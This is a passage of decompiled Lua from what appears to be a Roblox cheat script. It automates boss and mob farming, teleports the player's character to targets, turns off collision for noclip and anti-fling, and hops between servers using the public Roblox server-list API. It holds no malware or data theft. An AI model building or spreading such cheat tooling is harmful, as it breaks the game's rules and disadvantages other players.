        local iterationCursor2, iterationCursor3, iterationCursor4, iterationCursor5, iterationCursor6, iterationLimit, iterationLimit2, iterationLimit3, iterationStep, iterationStep2, iterationStep3, iteratorKey
        local iteratorKey2, iteratorKey3, iteratorKey4, iteratorKey5, iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, lowerResult, lowerResult2, result, result2
        local result3, result4, result5, result6, result7, savedIterations, savedIterations2, savedIterations3, savedIterations4, savedIterations5, savedIterations6, value
        local value2
        if not environment._G.CurrentLockedBoss then
            callResults6 = runtime.pack(environment.pairs(capturedOptions.SelectBoss.Value))
            callResults7 = callResults6
            savedIterations5 = { nil, [5] = nil, nil, nil }
            result6 = runtime.wrapIterator(runtime.iteratorBody1)
            result6(callResults7[1], callResults7[2], callResults7[3])
            currentLockedBoss2 = nil
            iteratorValue2 = nil
            iterationCursor4 = result6
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor4()
                if not hasNext then
                else
                    currentLockedBoss2 = iteratorKey
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    if (not iteratorValue2) or not (capturedCallback(currentLockedBoss2)) then
                        continue
                    else
                        gValue = environment._G
                        gValue.CurrentLockedBoss = currentLockedBoss2
                        gValue2 = environment._G
                        bossWaitTimer = environment.tick()
                        gValue2.BossWaitTimer = bossWaitTimer
                    end
                end
                break
            end
            iterationCursor6 = savedIterations5[3]
            iterationLimit = savedIterations5[2]
            iterationStep = savedIterations5[5]
            savedIterations = savedIterations5[1]
        end
        if not environment._G.CurrentLockedBoss then
            gValue5 = environment._G
            gValue5.BossIsActive = false
        else
            gValue4 = environment._G
            gValue4.BossIsActive = true
            result2 = capturedCallback4(environment._G.CurrentLockedBoss)
            value = capturedItems3[environment._G.CurrentLockedBoss]
            if not result2 then
                if not ((not value) or not capturedLocalPlayer2.Character) then
                    character = capturedLocalPlayer2.Character
                    if
                        not (
                            not (character.FindFirstChild(character, "HumanoidRootPart"))
                            or not (
                                30
                                < (
                                    (
                                        capturedLocalPlayer2.Character.HumanoidRootPart.Position
                                        - value.Position
                                    )
                                ).Magnitude
                            )
                        )
                    then
                        capturedCallback8(value)
                    end
                end
                if 60 < ((environment.tick()) - environment._G.BossWaitTimer) then
                    globalChatAlert = environment._G.GlobalChatAlert
                    currentLockedBoss3 = environment._G.CurrentLockedBoss
                    globalChatAlert[currentLockedBoss3] = false
                    callResults2 = runtime.pack(environment.pairs(environment._G.GlobalBossStates))
                    callResults3 = callResults2
                    savedIterations2 =
                        { savedIterations, [5] = iterationStep, iterationLimit, iterationCursor6 }
                    result4 = runtime.wrapIterator(runtime.iteratorBody1)
                    result4(callResults3[1], callResults3[2], callResults3[3])
                    iteratorKey3 = nil
                    iterationCursor = result4
                    while true do
                        hasNext2, iteratorKey2, iteratorValue3 = iterationCursor()
                        if not hasNext2 then
                        else
                            iteratorKey3 = iteratorKey2
                        end
                        if hasNext2 then
                            find = environment.string.find
                            lowerResult = environment.string.lower(environment._G.CurrentLockedBoss)
                            callResults = runtime.pack(environment.string.lower(iteratorKey3))
                            if
                                find(
                                    lowerResult,
                                    runtime.unpack(callResults, 1, (((callResults.n + 8) - 1) - 7))
                                )
                            then
                                globalBossStates2 = environment._G.GlobalBossStates
                                globalBossStates2[iteratorKey3] = false
                            end
                            continue
                        end
                        break
                    end
                    iterationCursor5 = savedIterations2[3]
                    iterationLimit3 = savedIterations2[2]
                    iterationStep3 = savedIterations2[5]
                    savedIterations6 = savedIterations2[1]
                    gValue8 = environment._G
                    gValue8.CurrentLockedBoss = currentLockedBoss
                end
            else
                gValue7 = environment._G
                bossWaitTimer2 = environment.tick()
                gValue7.BossWaitTimer = bossWaitTimer2
                while true do
                    if capturedOptions.AutoBossFarm.Value then
                        gValue6 = environment._G
                        gValue6.BossIsActive = true
                        result3 = capturedCallback4(environment._G.CurrentLockedBoss)
                        if not result3 then
                            environment.task.wait(1.5)
                            result3 = (capturedCallback4(environment._G.CurrentLockedBoss))
                            if result3 then
                                result = result3
                                humanoid = result.FindFirstChild(result, "Humanoid")
                                if not ((not humanoid) or (humanoid.Health <= 0)) then
                                    result7 = result3
                                    humanoidRootPart = result7.FindFirstChild(result7, "HumanoidRootPart")
                                    if humanoidRootPart then
                                        value2 = capturedCallback8
                                        callResults8 = runtime.pack(capturedCallback13(humanoidRootPart))
                                        value2(
                                            runtime.unpack(callResults8, 1, (((callResults8.n + 7) - 1) - 6))
                                        )
                                        if
                                            not (
                                                not environment._G.AutoEquipEnabled
                                                or not environment._G.SelectedWeaponGroup
                                            )
                                        then
                                            capturedCallback15(environment._G.SelectedWeaponGroup)
                                        end
                                        capturedCallback14()
                                    end
                                    environment.task.wait(0.1)
                                    continue
                                end
                            end
                        else
                            result = result3
                            humanoid = result.FindFirstChild(result, "Humanoid")
                            if not ((not humanoid) or (humanoid.Health <= 0)) then
                                result7 = result3
                                humanoidRootPart = result7.FindFirstChild(result7, "HumanoidRootPart")
                                if humanoidRootPart then
                                    value2 = capturedCallback8
                                    callResults8 = runtime.pack(capturedCallback13(humanoidRootPart))
                                    value2(runtime.unpack(callResults8, 1, (((callResults8.n + 7) - 1) - 6)))
                                    if
                                        not (
                                            not environment._G.AutoEquipEnabled
                                            or not environment._G.SelectedWeaponGroup
                                        )
                                    then
                                        capturedCallback15(environment._G.SelectedWeaponGroup)
                                    end
                                    capturedCallback14()
                                end
                                environment.task.wait(0.1)
                                continue
                            end
                        end
                    end
                    break
                end
                if environment._G.CurrentLockedBoss then
                    globalChatAlert2 = environment._G.GlobalChatAlert
                    currentLockedBoss4 = environment._G.CurrentLockedBoss
                    globalChatAlert2[currentLockedBoss4] = false
                    callResults4 = runtime.pack(environment.pairs(environment._G.GlobalBossStates))
                    callResults5 = callResults4
                    savedIterations3 =
                        { savedIterations, [5] = iterationStep, iterationLimit, iterationCursor6 }
                    result5 = runtime.wrapIterator(runtime.iteratorBody1)
                    result5(callResults5[1], callResults5[2], callResults5[3])
                    iteratorKey4 = nil
                    iterationCursor2 = result5
                    while true do
                        hasNext3, iteratorKey5, iteratorValue4 = iterationCursor2()
                        if not hasNext3 then
                        else
                            iteratorKey4 = iteratorKey5
                        end
                        if hasNext3 then
                            find2 = environment.string.find
                            lowerResult2 = environment.string.lower(environment._G.CurrentLockedBoss)
                            callResults9 = runtime.pack(environment.string.lower(iteratorKey4))
                            if
                                find2(
                                    lowerResult2,
                                    runtime.unpack(callResults9, 1, (((callResults9.n + 8) - 1) - 7))
                                )
                            then
                                globalBossStates = environment._G.GlobalBossStates
                                globalBossStates[iteratorKey4] = false
                            end
                            continue
                        end
                        break
                    end
                    iterationCursor3 = savedIterations3[3]
                    iterationLimit2 = savedIterations3[2]
                    iterationStep2 = savedIterations3[5]
                    savedIterations4 = savedIterations3[1]
                end
                gValue3 = environment._G
                gValue3.CurrentLockedBoss = currentLockedBoss
            end
        end
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine78(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value
        while true do
            environment.task.wait(3)
            if environment._G.AutoServerHop then
                gameValue = environment.game
                value = (gameValue.GetService(gameValue, "Players"))
                if 1 < #(value.GetPlayers(value)) then
                    environment.pcall(functions.handleGetServiceAtLine22(environment))
                end
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleGetServiceAtLine22(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, gameValue, gameValue2, gameValue3, gameValue4, hasNext, httpGetResult, httpService, httpService2, id, iterationCursor
        local iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, jSONDecodeResult, jobId, placeId, result, savedIterations, savedIterations2
        local teleportService, teleportService2, teleportService3, teleportToPlaceInstance, textValue
        gameValue2 = environment.game
        httpService = gameValue2.GetService(gameValue2, "HttpService")
        gameValue3 = environment.game
        teleportService3 = gameValue3.GetService(gameValue3, "TeleportService")
        placeId = environment.game.PlaceId
        jobId = environment.game.JobId
        textValue = (
            "https://games.roblox.com/v1/games/"
            .. ((environment.tostring(placeId)) .. "/servers/Public?sortOrder=Asc&limit=100")
        )
        gameValue4 = environment.game
        httpGetResult = gameValue4.HttpGet(gameValue4, textValue)
        httpService2 = httpService
        jSONDecodeResult = httpService2.JSONDecode(httpService2, httpGetResult)
        if not ((not jSONDecodeResult) or not jSONDecodeResult.data) then
            callResults = runtime.pack(environment.ipairs(jSONDecodeResult.data))
            callResults2 = callResults
            savedIterations2 = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults2[1], callResults2[2], callResults2[3])
            iteratorValue2 = nil
            iterationCursor2 = result
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor2()
                if not hasNext then
                else
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    if
                        not (iteratorValue2.playing < iteratorValue2.maxPlayers)
                        or (iteratorValue2.id == jobId)
                    then
                        continue
                    else
                        teleportService = teleportService3
                        teleportService2 = teleportService
                        teleportToPlaceInstance = teleportService.TeleportToPlaceInstance
                        id = iteratorValue2.id
                        gameValue = environment.game
                        teleportToPlaceInstance(
                            teleportService2,
                            placeId,
                            id,
                            (gameValue.GetService(gameValue, "Players")).LocalPlayer
                        )
                        environment.task.wait(2)
                    end
                end
                break
            end
            iterationCursor = savedIterations2[3]
            iterationLimit = savedIterations2[2]
            iterationStep = savedIterations2[5]
            savedIterations = savedIterations2[1]
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback23(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedSummonAnosBoss = ...
        local gValue
        gValue = environment._G
        gValue.SelectedSummonAnosBoss = selectedSummonAnosBoss
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine7(
    closureEnvironment,
    capturedLocalPlayer2,
    capturedPlayers,
    capturedOptions,
    capturedCallback,
    capturedCallback2
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        environment.pcall(
            functions.handleFindFirstChild7(
                environment,
                capturedLocalPlayer2,
                capturedPlayers,
                capturedOptions,
                capturedCallback,
                capturedCallback2
            )
        )
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChild7(
    closureEnvironment,
    capturedLocalPlayer2,
    capturedPlayers,
    capturedOptions,
    capturedCallback,
    capturedCallback2
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local assemblyAngularVelocity, assemblyLinearVelocity, callResults, callResults10, callResults11, callResults12, callResults13, callResults14, callResults15, callResults16, callResults17, callResults18
        local callResults2, callResults3, callResults4, callResults5, callResults6, callResults7, callResults8, callResults9, character, character2, character3, character4
        local character5, character6, enabled, enemies, hasNext, hasNext2, hasNext3, hasNext4, hasNext5, hasNext6, humanoid, humanoidRootPart
        local humanoidRootPart2, items, items2, iterationCursor, iterationCursor2, iterationCursor3, iterationCursor4, iterationCursor5, iterationCursor6, iterationCursor7, iterationCursor8, iterationCursor9
        local iterationLimit, iterationLimit2, iterationLimit3, iterationStep, iterationStep2, iterationStep3, iteratorKey, iteratorKey2, iteratorKey3, iteratorKey4, iteratorKey5, iteratorKey6
        local iteratorValue, iteratorValue10, iteratorValue11, iteratorValue12, iteratorValue13, iteratorValue14, iteratorValue15, iteratorValue16, iteratorValue17, iteratorValue18, iteratorValue2, iteratorValue3
        local iteratorValue4, iteratorValue5, iteratorValue6, iteratorValue7, iteratorValue8, iteratorValue9, mobs, nPCs, pairsValue, pairsValue2, pairsValue3, pairsValue4
        local pairsValue5, result, result2, result3, result4, result5, result6, savedIterations, savedIterations2, savedIterations3, savedIterations4, savedIterations5
        local savedIterations6, savedIterations7, savedIterations8, savedIterations9, value, workspaceValue, workspaceValue2, workspaceValue3, workspaceValue4
        character3 = capturedLocalPlayer2.Character
        if character3 then
            character4 = character3
            if character4.FindFirstChild(character4, "HumanoidRootPart") then
                character5 = character3
                if character5.FindFirstChild(character5, "Humanoid") then
                    humanoidRootPart2 = character3.HumanoidRootPart
                    humanoid = character3.Humanoid
                    if environment._G.AntiFling then
                        pairsValue4 = environment.pairs
                        value = capturedPlayers
                        callResults13 = runtime.pack(value.GetPlayers(value))
                        callResults14 = runtime.pack(
                            pairsValue4(runtime.unpack(callResults13, 1, (((callResults13.n + 5) - 1) - 4)))
                        )
                        callResults15 = callResults14
                        savedIterations7 = { nil, [5] = nil, nil, nil }
                        result5 = runtime.wrapIterator(runtime.iteratorBody1)
                        result5(callResults15[1], callResults15[2], callResults15[3])
                        iteratorValue10 = nil
                        iterationCursor7 = result5
                        while true do
                            hasNext2, iteratorKey2, iteratorValue7 = iterationCursor7()
                            if not hasNext2 then
                            else
                                iteratorValue10 = iteratorValue7
                            end
                            if hasNext2 then
                                if
                                    (iteratorValue10 ~= capturedLocalPlayer2) and iteratorValue10.Character
                                then
                                    character = iteratorValue10.Character
                                    if character.FindFirstChild(character, "HumanoidRootPart") then
                                        pairsValue = environment.pairs
                                        character2 = iteratorValue10.Character
                                        callResults4 = runtime.pack(character2.GetChildren(character2))
                                        callResults5 = runtime.pack(
                                            pairsValue(
                                                runtime.unpack(
                                                    callResults4,
                                                    1,
                                                    (((callResults4.n + 8) - 1) - 7)
                                                )
                                            )
                                        )
                                        callResults6 = callResults5
                                        savedIterations2 = {
                                            savedIterations7,
                                            [5] = iterationStep,
                                            iterationLimit2,
                                            iterationCursor7,
                                        }
                                        result2 = runtime.wrapIterator(runtime.iteratorBody1)
                                        result2(callResults6[1], callResults6[2], callResults6[3])
                                        iteratorValue14 = nil
                                        iterationCursor2 = result2
                                        while true do
                                            hasNext4, iteratorKey4, iteratorValue13 = iterationCursor2()
                                            if not hasNext4 then
                                            else
                                                iteratorValue14 = iteratorValue13
                                            end
                                            if hasNext4 then
                                                iteratorValue3 = iteratorValue14
                                                if iteratorValue3.IsA(iteratorValue3, "BasePart") then
                                                    iteratorValue14.CanCollide = false
                                                end
                                                continue
                                            end
                                            break
                                        end
                                        iterationCursor7 = savedIterations2[3]
                                        iterationLimit2 = savedIterations2[2]
                                        iterationStep = savedIterations2[5]
                                        savedIterations7 = savedIterations2[1]
                                    end
                                end
                                continue
                            end
                            break
                        end
                        iterationCursor9 = savedIterations7[3]
                        iterationLimit3 = savedIterations7[2]
                        iterationStep3 = savedIterations7[5]
                        savedIterations9 = savedIterations7[1]
                        items = runtime.create(3)
                        workspaceValue = environment.workspace
                        enemies = workspaceValue.FindFirstChild(workspaceValue, "Enemies")
                        workspaceValue2 = environment.workspace
                        mobs = workspaceValue2.FindFirstChild(workspaceValue2, "Mobs")
                        workspaceValue3 = environment.workspace
                        nPCs = workspaceValue3.FindFirstChild(workspaceValue3, "NPCs")
                        workspaceValue4 = environment.workspace
                        callResults16 = runtime.pack(workspaceValue4.FindFirstChild(workspaceValue4, "Npcs"))
                        items2 = items
                        runtime.move({ enemies, mobs, nPCs }, 1, 3, 1, items2)
                        runtime.move(callResults16, 1, (((callResults16.n + 8) - 1) - 7), 4, items2)
                        callResults17 = runtime.pack(environment.pairs(items))
                        callResults18 = callResults17
                        savedIterations8 =
                            { savedIterations9, [5] = iterationStep3, iterationLimit3, iterationCursor9 }
                        result6 = runtime.wrapIterator(runtime.iteratorBody1)
                        result6(callResults18[1], callResults18[2], callResults18[3])
                        iteratorValue16 = nil
                        iterationCursor8 = result6
                        while true do
                            hasNext5, iteratorKey5, iteratorValue15 = iterationCursor8()
                            if not hasNext5 then
                            else
                                iteratorValue16 = iteratorValue15
                            end
                            if hasNext5 then
                                if iteratorValue16 then
                                    pairsValue2 = environment.pairs
                                    iteratorValue8 = iteratorValue16
                                    callResults7 = runtime.pack(iteratorValue8.GetChildren(iteratorValue8))
                                    callResults8 = runtime.pack(
                                        pairsValue2(
                                            runtime.unpack(callResults7, 1, (((callResults7.n + 9) - 1) - 8))
                                        )
                                    )
                                    callResults9 = callResults8
                                    savedIterations6 = {
                                        savedIterations8,
                                        [5] = iterationStep3,
                                        iterationLimit3,
                                        iterationCursor8,
                                    }
                                    result3 = runtime.wrapIterator(runtime.iteratorBody1)
                                    result3(callResults9[1], callResults9[2], callResults9[3])
                                    iteratorValue2 = nil
                                    iterationCursor6 = result3
                                    while true do
                                        hasNext, iteratorKey, iteratorValue = iterationCursor6()
                                        if not hasNext then
                                        else
                                            iteratorValue2 = iteratorValue
                                        end
                                        if hasNext then
                                            iteratorValue4 = iteratorValue2
                                            humanoidRootPart = iteratorValue4.FindFirstChild(
                                                iteratorValue4,
                                                "HumanoidRootPart"
                                            )
                                            if
                                                not (
                                                    not humanoidRootPart
                                                    or not (
                                                        (
                                                            (
                                                                humanoidRootPart.Position
                                                                - humanoidRootPart2.Position
                                                            )
                                                        ).Magnitude
                                                        < 50
                                                    )
                                                )
                                            then
                                                pairsValue3 = environment.pairs
                                                iteratorValue9 = iteratorValue2
                                                callResults10 =
                                                    runtime.pack(iteratorValue9.GetChildren(iteratorValue9))
                                                callResults11 = runtime.pack(
                                                    pairsValue3(
                                                        runtime.unpack(
                                                            callResults10,
                                                            1,
                                                            (((callResults10.n + 13) - 1) - 12)
                                                        )
                                                    )
                                                )
                                                callResults12 = callResults11
                                                savedIterations3 = {
                                                    savedIterations6,
                                                    [5] = iterationStep3,
                                                    iterationLimit3,
                                                    iterationCursor6,
                                                }
                                                result4 = runtime.wrapIterator(runtime.iteratorBody1)
                                                result4(callResults12[1], callResults12[2], callResults12[3])
                                                iteratorValue12 = nil
                                                iterationCursor4 = result4
                                                while true do
                                                    hasNext3, iteratorKey3, iteratorValue11 =
                                                        iterationCursor4()
                                                    if not hasNext3 then
                                                    else
                                                        iteratorValue12 = iteratorValue11
                                                    end
                                                    if hasNext3 then
                                                        iteratorValue6 = iteratorValue12
                                                        if iteratorValue6.IsA(iteratorValue6, "BasePart") then
                                                            iteratorValue12.CanCollide = false
                                                        end
                                                        continue
                                                    end
                                                    break
                                                end
                                                iterationCursor6 = savedIterations3[3]
                                                iterationLimit3 = savedIterations3[2]
                                                iterationStep3 = savedIterations3[5]
                                                savedIterations6 = savedIterations3[1]
                                            end
                                            continue
                                        end
                                        break
                                    end
                                    iterationCursor8 = savedIterations6[3]
                                    iterationLimit3 = savedIterations6[2]
                                    iterationStep3 = savedIterations6[5]
                                    savedIterations8 = savedIterations6[1]
                                end
                                continue
                            end
                            break
                        end
                        iterationCursor3 = savedIterations8[3]
                        iterationLimit2 = savedIterations8[2]
                        iterationStep = savedIterations8[5]
                        savedIterations5 = savedIterations8[1]
                    end
                    enabled = false
                    if
                        not (
                            not capturedOptions
                            or (
                                (
                                    (
                                        (
                                            (
                                                not capturedOptions.AutoMobFarm
                                                or not capturedOptions.AutoMobFarm.Value
                                            )
                                            and (
                                                not capturedOptions.AutoBossFarm
                                                or not capturedOptions.AutoBossFarm.Value
                                            )
                                        )
                                        and (
                                            (
                                                (
                                                    (
                                                        (
                                                            (
                                                                (
                                                                    not capturedOptions.AutoFarmAllMob
                                                                    or not capturedOptions.AutoFarmAllMob.Value
                                                                )
                                                                and (
                                                                    (
                                                                        not capturedOptions.AutoFarmSpecificLoop
                                                                        or not capturedOptions.AutoFarmSpecificLoop.Value
                                                                    )
                                                                    and (
                                                                        not capturedOptions.AutoEventFarm
                                                                        or not capturedOptions.AutoEventFarm.Value
                                                                    )
                                                                )
                                                            )
                                                            and (
                                                                not capturedOptions.AutoKillSummon
                                                                or not capturedOptions.AutoKillSummon.Value
                                                            )
                                                        )
                                                        and (
                                                            (
                                                                (
                                                                    not capturedOptions.AutoKillPity
                                                                    or not capturedOptions.AutoKillPity.Value
                                                                )
                                                                and (
                                                                    not capturedOptions.AutoKillBossV2
                                                                    or not capturedOptions.AutoKillBossV2.Value
                                                                )
                                                            )
                                                            and (
                                                                not capturedOptions.AutoKillBossAnos
                                                                or not capturedOptions.AutoKillBossAnos.Value
                                                            )
                                                        )
                                                    )
                                                    and (
                                                        not capturedOptions.AutoKillGilgamesh
                                                        or not capturedOptions.AutoKillGilgamesh.Value
                                                    )
                                                )
                                                and (
                                                    not capturedOptions.AutoKillMaiden
                                                    or not capturedOptions.AutoKillMaiden.Value
                                                )
                                            )
                                            and (
                                                (
                                                    not capturedOptions.AutoKillRimuru
                                                    or not capturedOptions.AutoKillRimuru.Value
                                                )
                                                and (
                                                    not capturedOptions.AutoKillTrueAizen
                                                    or not capturedOptions.AutoKillTrueAizen.Value
                                                )
                                            )
                                        )
                                    )
                                    and (
                                        not capturedOptions.AutoKillSaberAlter
                                        or not capturedOptions.AutoKillSaberAlter.Value
                                    )
                                )
                                and (
                                    (
                                        not capturedOptions.AutoEventFarmV3
                                        or not capturedOptions.AutoEventFarmV3.Value
                                    )
                                    and (
                                        (
                                            not capturedOptions.AutoFarmLevel
                                            or not capturedOptions.AutoFarmLevel.Value
                                        )
                                        and (
                                            (
                                                not capturedOptions.AutoQuestHaki
                                                or not capturedOptions.AutoQuestHaki.Value
                                            )
                                            and (
                                                (
                                                    (
                                                        (
                                                            not capturedOptions.AutoQuestJinwoo
                                                            or not capturedOptions.AutoQuestJinwoo.Value
                                                        )
                                                        and (
                                                            not capturedOptions.AutoKillHollow250
                                                            or not capturedOptions.AutoKillHollow250.Value
                                                        )
                                                    )
                                                    and (
                                                        not capturedOptions.StartKillDungeon
                                                        or not capturedOptions.StartKillDungeon.Value
                                                    )
                                                )
                                                and (
                                                    (
                                                        (
                                                            (
                                                                not capturedOptions.AutoFarmArtifacts
                                                                or not capturedOptions.AutoFarmArtifacts.Value
                                                            )
                                                            and (
                                                                (
                                                                    not capturedOptions.AutoSlimeEvent
                                                                    or not capturedOptions.AutoSlimeEvent.Value
                                                                )
                                                                and (
                                                                    not capturedOptions.AutoDemoniteEvent
                                                                    or not capturedOptions.AutoDemoniteEvent.Value
                                                                )
                                                            )
                                                        )
                                                        and (
                                                            not capturedOptions.AutoJigsawEvent
                                                            or not capturedOptions.AutoJigsawEvent.Value
                                                        )
                                                    )
                                                    and (
                                                        not capturedOptions.AutoHogyokuEvent
                                                        or not capturedOptions.AutoHogyokuEvent.Value
                                                    )
                                                )
                                            )
                                        )
                                    )
                                )
                            )
                        )
                    then
                        enabled = true
                    end
                    if not enabled then
                        if humanoidRootPart2 then
                            capturedCallback2(humanoidRootPart2)
                        end
                        if humanoid.PlatformStand then
                            humanoid.PlatformStand = false
                        end
                    else
                        assemblyLinearVelocity = environment.Vector3.zero
                        humanoidRootPart2.AssemblyLinearVelocity = assemblyLinearVelocity
                        assemblyAngularVelocity = environment.Vector3.zero
                        humanoidRootPart2.AssemblyAngularVelocity = assemblyAngularVelocity
                        pairsValue5 = environment.pairs
                        character6 = character3
                        callResults = runtime.pack(character6.GetChildren(character6))
                        callResults2 = runtime.pack(
                            pairsValue5(runtime.unpack(callResults, 1, (((callResults.n + 6) - 1) - 5)))
                        )
                        callResults3 = callResults2
                        savedIterations =
                            { savedIterations5, [5] = iterationStep, iterationLimit2, iterationCursor3 }
                        result = runtime.wrapIterator(runtime.iteratorBody1)
                        result(callResults3[1], callResults3[2], callResults3[3])
                        iteratorValue18 = nil
                        iterationCursor = result
                        while true do
                            hasNext6, iteratorKey6, iteratorValue17 = iterationCursor()
                            if not hasNext6 then
                            else
                                iteratorValue18 = iteratorValue17
                            end
                            if hasNext6 then
                                iteratorValue5 = iteratorValue18
                                if iteratorValue5.IsA(iteratorValue5, "BasePart") then
                                    iteratorValue18.CanCollide = false
                                end
                                continue
                            end
                            break
                        end
                        iterationCursor5 = savedIterations[3]
                        iterationLimit = savedIterations[2]
                        iterationStep2 = savedIterations[5]
                        savedIterations4 = savedIterations[1]
                        if environment._G.FarmPosition == "Above" then
                            capturedCallback(humanoidRootPart2)
                            humanoid.PlatformStand = true
                        else
                            capturedCallback2(humanoidRootPart2)
                            humanoid.PlatformStand = false
                        end
                    end
                end
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine11(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, callResults5, callResults6, hasNext, hasNext2, items, items2, iterationCursor, iterationCursor2
        local iterationCursor3, iterationLimit, iterationLimit2, iterationStep, iterationStep2, iteratorKey, iteratorKey2, iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5
        local iteratorValue6, nPCs, pairsValue, result, result2, savedIterations, savedIterations2, savedIterations3, workspaceValue, workspaceValue2, workspaceValue3
        items = runtime.create(2)
        workspaceValue = environment.workspace
        workspaceValue2 = environment.workspace
        nPCs = workspaceValue2.FindFirstChild(workspaceValue2, "NPCs")
        workspaceValue3 = environment.workspace
        callResults4 = runtime.pack(workspaceValue3.FindFirstChild(workspaceValue3, "Enemies"))
        items2 = items
        runtime.move({ workspaceValue, nPCs }, 1, 2, 1, items2)
        runtime.move(callResults4, 1, (((callResults4.n + 4) - 1) - 3), 3, items2)
        callResults5 = runtime.pack(environment.pairs(items))
        callResults6 = callResults5
        savedIterations = { nil, [5] = nil, nil, nil }
        result2 = runtime.wrapIterator(runtime.iteratorBody1)
        result2(callResults6[1], callResults6[2], callResults6[3])
        iteratorValue5 = nil
        iterationCursor = result2
        while true do
            hasNext2, iteratorKey2, iteratorValue4 = iterationCursor()
            if not hasNext2 then
            else
                iteratorValue5 = iteratorValue4
            end
            if hasNext2 then
                if not iteratorValue5 then
                    continue
                else
                    pairsValue = environment.pairs
                    iteratorValue = iteratorValue5
                    callResults = runtime.pack(iteratorValue.GetChildren(iteratorValue))
                    callResults2 = runtime.pack(
                        pairsValue(runtime.unpack(callResults, 1, (((callResults.n + 6) - 1) - 5)))
                    )
                    callResults3 = callResults2
                    savedIterations2 =
                        { savedIterations, [5] = iterationStep2, iterationLimit2, iterationCursor }
                    result = runtime.wrapIterator(runtime.iteratorBody1)
                    result(callResults3[1], callResults3[2], callResults3[3])
                    iteratorValue2 = nil
                    iterationCursor2 = result
                    while true do
                        hasNext, iteratorKey, iteratorValue3 = iterationCursor2()
                        if not hasNext then
                        else
                            iteratorValue2 = iteratorValue3
                        end
                        if hasNext then
                            if not (environment.string.find(iteratorValue2.Name, "Rimuru")) then
                                continue
                            else
                                iteratorValue6 = iteratorValue2
                                if
                                    not (iteratorValue6.FindFirstChild(iteratorValue6, "Humanoid"))
                                    or not (0 < iteratorValue2.Humanoid.Health)
                                then
                                    continue
                                else
                                    return true
                                end
                            end
                        end
                        break
                    end
                    iterationCursor = savedIterations2[3]
                    iterationLimit2 = savedIterations2[2]
                    iterationStep2 = savedIterations2[5]
                    savedIterations = savedIterations2[1]
                    continue
                end
            end
            break
        end
        iterationCursor3 = savedIterations[3]
        iterationLimit = savedIterations[2]
        iterationStep = savedIterations[5]
        savedIterations3 = savedIterations[1]
        return false
    end, closureEnvironment)
end

function functions.handleFindFirstChild8(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, findFirstChildResult4, humanoid, humanoidRootPart, nPCReady, nPCs, nPCs2, workspaceValue
        argument12 = argument1
        workspaceValue = environment.workspace
        nPCs = workspaceValue.FindFirstChild(workspaceValue, "NPCs")
        if not nPCs then
            return nil, false
        else
            nPCs2 = nPCs
            findFirstChildResult4 = nPCs2.FindFirstChild(nPCs2, argument12)
            if not findFirstChildResult4 then
                return nil, false
            else
                findFirstChildResult = findFirstChildResult4
                nPCReady = findFirstChildResult.GetAttribute(findFirstChildResult, "_NPCReady")
                findFirstChildResult2 = findFirstChildResult4
                humanoid = findFirstChildResult2.FindFirstChildOfClass(findFirstChildResult2, "Humanoid")
                findFirstChildResult3 = findFirstChildResult4
                humanoidRootPart =
                    findFirstChildResult3.FindFirstChild(findFirstChildResult3, "HumanoidRootPart")
                if (((nPCReady == true) and humanoid) and humanoidRootPart) and (0 < humanoid.Health) then
                    return findFirstChildResult4, true
                else
                    return findFirstChildResult4, false
                end
            end
        end
    end, closureEnvironment)
end

function functions.handleNew7(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local callback
        if argument1 == true then
            callback = functions.handleCallbackAtLine120(
                environment,
                capturedCallback9,
                (
                    environment.CFrame.new(
                        -1235.08276,
                        16.6130219,
                        279.549835,
                        0.963941038,
                        0,
                        0.266115874,
                        0,
                        1,
                        0,
                        -0.266115874,
                        0,
                        0.963941038
                    )
                )
            )
            environment.task.spawn(callback)
        end
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine120(closureEnvironment, capturedCallback9, capturedSharedValue)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        capturedCallback9(capturedSharedValue.Position)
        return
    end, closureEnvironment)
end

function functions.handleCallback24(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedMaidenDifficulty = ...
        local gValue
        gValue = environment._G
        gValue.SelectedMaidenDifficulty = selectedMaidenDifficulty
        return
    end, closureEnvironment)
end

function functions.handleSpawn8(
    closureEnvironment,
    capturedItems41,
    capturedCallback6,
    capturedLocalPlayer2,
    capturedTextValueState,
    capturedCallback12,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14,
    capturedCallback5,
    capturedItems44
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local autoMobFarm = ...
        local gValue
        gValue = environment._G
        gValue.AutoMobFarm = autoMobFarm
        if environment._G.AutoMobFarm then
            environment.task.spawn(
                functions.handlePcallAtLine101(environment, capturedItems41, capturedCallback6)
            )
            environment.task.spawn(
                functions.handlePcallAtLine18(
                    environment,
                    capturedItems41,
                    capturedLocalPlayer2,
